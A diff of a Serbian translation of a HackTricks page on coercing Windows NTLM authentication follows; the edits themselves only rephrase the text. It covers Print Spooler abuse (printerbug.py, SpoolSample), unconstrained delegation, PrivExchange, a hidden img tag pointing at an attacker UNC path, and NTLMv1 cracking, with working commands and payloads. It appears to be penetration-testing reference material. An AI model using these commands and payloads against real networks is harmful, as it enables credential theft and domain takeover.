@@ -9,7 +9,7 @@
 ## Spooler Service Abuse
 
 Ako je _**Print Spooler**_ servis **omogućen,** možete koristiti neke već poznate AD akreditive da **zatražite** od štampača na kontroleru domena **ažuriranje** o novim poslovima štampe i jednostavno mu reći da **pošalje obaveštenje nekom sistemu**.\
-Napomena: kada štampač pošalje obaveštenje nekom proizvoljnom sistemu, mora da se **autentifikuje** protiv tog **sistema**. Stoga, napadač može naterati _**Print Spooler**_ servis da se autentifikuje protiv proizvoljnog sistema, a servis će **koristiti račun računara** u ovoj autentifikaciji.
+Napomena: kada štampač pošalje obaveštenje na proizvoljne sisteme, mora da se **autentifikuje** protiv tog **sistema**. Stoga, napadač može naterati _**Print Spooler**_ servis da se autentifikuje protiv proizvoljnog sistema, a servis će **koristiti račun računara** u ovoj autentifikaciji.
 
 ### Finding Windows Servers on the domain
 
@@ -19,7 +19,7 @@ Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (Operati
 ```
 ### Pronalaženje Spooler usluga koje slušaju
 
-Koristeći malo modifikovani @mysmartlogin-ov (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), proverite da li Spooler usluga sluša:
+Koristeći malo izmenjeni @mysmartlogin-ov (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), proverite da li Spooler usluga sluša:
 ```bash
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
@@ -28,7 +28,7 @@ Možete takođe koristiti rpcdump.py na Linux-u i tražiti MS-RPRN protokol.
 ```bash
 rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
-### Zatražite od servisa da se autentifikuje protiv proizvoljnog hosta
+### Zatražite od usluge da se autentifikuje protiv proizvoljnog hosta
 
 Možete kompajlirati[ **SpoolSample odavde**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
 ```bash
@@ -41,7 +41,7 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
 ### Kombinovanje sa Neograničenom Delegacijom
 
-Ako je napadač već kompromitovao računar sa [Neograničenom Delegacijom](unconstrained-delegation.md), napadač bi mogao **naterati štampač da se autentifikuje protiv ovog računara**. Zbog neograničene delegacije, **TGT** **računarskog naloga štampača** će biti **sačuvan u** **memoriji** računara sa neograničenom delegacijom. Pošto je napadač već kompromitovao ovaj host, moći će da **izvuče ovu kartu** i zloupotrebi je ([Pass the Ticket](pass-the-ticket.md)).
+Ako je napadač već kompromitovao računar sa [Neograničenom Delegacijom](unconstrained-delegation.md), napadač može **naterati štampač da se autentifikuje protiv ovog računara**. Zbog neograničene delegacije, **TGT** **računarskog naloga štampača** će biti **sačuvan u** **memoriji** računara sa neograničenom delegacijom. Pošto je napadač već kompromitovao ovaj host, moći će da **izvuče ovu kartu** i zloupotrebi je ([Pass the Ticket](pass-the-ticket.md)).
 
 ## RCP Prisilna autentifikacija
 
@@ -51,9 +51,9 @@ https://github.com/p0dalirius/Coercer
 
 ## PrivExchange
 
-Napad `PrivExchange` je rezultat greške pronađene u **Exchange Server `PushSubscription` funkciji**. Ova funkcija omogućava da bilo koji korisnik domena sa poštanskim sandučetom natera Exchange server da se autentifikuje na bilo kojem hostu koji obezbeđuje klijent preko HTTP-a.
+Napad `PrivExchange` je rezultat greške pronađene u **Exchange Server `PushSubscription` funkciji**. Ova funkcija omogućava da bilo koji korisnik domena sa poštanskim sandučetom natera Exchange server da se autentifikuje na bilo kojem klijentskom hostu putem HTTP-a.
 
-Podrazumevano, **Exchange servis radi kao SYSTEM** i ima prekomerne privilegije (specifično, ima **WriteDacl privilegije na domen pre-2019 Kumulativna Ažuriranja**). Ova greška se može iskoristiti za omogućavanje **preusmeravanja informacija na LDAP i naknadno vađenje NTDS baze podataka domena**. U slučajevima kada preusmeravanje na LDAP nije moguće, ova greška se i dalje može koristiti za preusmeravanje i autentifikaciju na druge hostove unutar domena. Uspešna eksploatacija ovog napada omogućava trenutni pristup Administraciji Domenom sa bilo kojim autentifikovanim korisničkim nalogom domena.
+Podrazumevano, **Exchange servis radi kao SYSTEM** i ima prekomerne privilegije (specifično, ima **WriteDacl privilegije na domen pre-2019 Kumulativna Ažuriranja**). Ova greška se može iskoristiti za omogućavanje **preusmeravanja informacija na LDAP i naknadno izvlačenje NTDS baze podataka domena**. U slučajevima kada preusmeravanje na LDAP nije moguće, ova greška se i dalje može koristiti za preusmeravanje i autentifikaciju na druge hostove unutar domena. Uspešna eksploatacija ovog napada omogućava trenutni pristup Administraciji Domenom sa bilo kojim autentifikovanim korisničkim nalogom domena.
 
 ## Unutar Windows-a
 
@@ -94,17 +94,17 @@ Ako znate **email adresu** korisnika koji se prijavljuje na mašinu koju želite
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-i kada to otvori, pokušaće da se autentifikuje.
+i kada ga otvori, pokušaće da se autentifikuje.
 
 ### MitM
 
-Ako možete da izvršite MitM napad na računar i ubacite HTML u stranicu koju će vizualizovati, mogli biste pokušati da ubacite sliku poput sledeće u stranicu:
+Ako možete da izvršite MitM napad na računar i ubrizgate HTML u stranicu koju će on videti, mogli biste pokušati da ubrizgate sliku poput sledeće u stranicu:
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-## Kršenje NTLMv1
+## Cracking NTLMv1
 
-Ako možete da uhvatite [NTLMv1 izazove pročitajte ovde kako da ih slomite](../ntlm/#ntlmv1-attack).\
-&#xNAN;_&#x52;emember da biste slomili NTLMv1 morate postaviti Responder izazov na "1122334455667788"_
+Ako možete uhvatiti [NTLMv1 izazove pročitajte ovde kako ih probiti](../ntlm/index.html#ntlmv1-attack).\
+&#xNAN;_&#x52;emember da biste probili NTLMv1 morate postaviti Responder izazov na "1122334455667788"_
 
 {{#include ../../banners/hacktricks-training.md}}
